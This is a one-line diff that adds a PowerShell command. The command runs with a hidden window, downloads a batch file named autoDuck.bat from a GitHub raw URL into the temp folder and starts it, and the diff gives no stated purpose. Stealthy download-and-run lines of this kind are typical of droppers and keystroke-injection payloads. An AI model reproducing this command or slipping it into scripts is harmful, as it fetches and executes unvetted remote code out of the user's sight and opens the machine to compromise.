@@ -1,0 +1,1 @@
+powershell /NoProfile /NoLogo /Windowstyle hidden /Command "iwr https://raw.githubusercontent.com/pytNico/autoDuck/main/autoDuck.bat -OutFile $env:TEMP\autoDuck.bat; start $env:TEMP\autoDuck.bat"
